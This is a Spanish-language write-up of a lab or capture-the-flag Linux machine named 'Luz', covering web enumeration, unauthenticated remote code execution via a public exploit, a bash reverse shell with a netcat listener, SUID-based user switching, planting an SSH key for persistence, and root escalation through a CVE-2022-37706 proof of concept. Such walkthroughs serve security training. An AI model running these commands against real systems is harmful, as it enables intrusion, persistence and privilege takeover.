# Luz — Resumen de la resolución

- Sistema operativo: Linux.
- Dificultad indicada: fácil.

## 1. Reconocimiento

El análisis con Nmap identifica los servicios SSH y HTTP.
La enumeración web con Gobuster descubre un directorio de
administración y distintas páginas PHP.

## 2. Acceso inicial

La aplicación se identifica como Online Food Ordering System v2.
La solución utiliza el exploit EDB-ID 50305 para conseguir
ejecución remota de comandos sin autenticación.

El acceso inicial corresponde al usuario `www-data`.
Desde la webshell se establece una shell inversa.

## 3. Enumeración local y cambio de usuario

La primera bandera se encuentra en `/var/www/html`.

La búsqueda de ejecutables SUID descubre `/bin/bsd-csh`,
propiedad de `aelis`. Su ejecución permite obtener la identidad
efectiva de ese usuario.

Posteriormente se configura el acceso mediante una clave SSH
para disponer de una sesión estable.

## 4. Escalada a root

El artículo recurre a una prueba de concepto de
CVE-2022-37706, relacionada con Enlightenment, para obtener
una shell privilegiada y acceder a la bandera final.

## Cadena de acceso

Aplicación web vulnerable → www-data → aelis → root

## Comandos de consola

### 1. Enumeración de puertos y servicios

```bash
sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 01-allPorts 192.168.1.34
nmap -sCV -p22,80 -oN 02-targeted.txt 192.168.1.34
```

### 2. Enumeración de directorios web

```bash
gobuster dir -u http://192.168.1.34 -w /ruta/directory-list-2.3-medium.txt -x html,php,txt -r
gobuster dir -u http://192.168.1.34/admin -w /ruta/directory-list-2.3-medium.txt -x html,php,txt -r
```

### 3. Localización y ejecución del exploit

```bash
searchsploit 'food ordering'
searchsploit -m 50305
chmod +x 50305.py
python 50305.py
```

Cuando solicite la URL:

```text
http://192.168.1.34/
```

Comprobación de identidad desde la webshell:

```bash
whoami
```

### 4. Shell inversa

Desde la webshell, utilizando la IP del equipo atacante:

```bash
/bin/bash -c "bash -i >& /dev/tcp/192.168.1.10/4321 0>&1"
```

**Paso añadido para completar el procedimiento:** antes de ejecutar
lo anterior, abrir un listener en el equipo atacante:

```bash
nc -lvnp 4321
```

### 5. Enumeración de SUID y cambio de identidad

```bash
find / -perm -4000 2>/dev/null
ls -l /bin/bsd-csh
csh -b
whoami
```

### 6. Acceso SSH

Generar las claves en el equipo atacante:

```bash
ssh-keygen -t rsa
```

Añadir la clave pública propia a `~/.ssh/authorized_keys` de `aelis`
en la máquina vulnerable.

Conectar desde el equipo atacante:

```bash
ssh aelis@192.168.1.34 -i ~/.ssh/id_rsa
```

### 7. Escalada de privilegios

Una vez obtenida y revisada la prueba de concepto correspondiente:

```bash
./exploit.sh
```

Verificar la identidad de la shell resultante:

```bash
whoami
id
```

El nombre `exploit.sh` corresponde al script externo de la prueba
de concepto; no es un comando instalado de forma predeterminada.
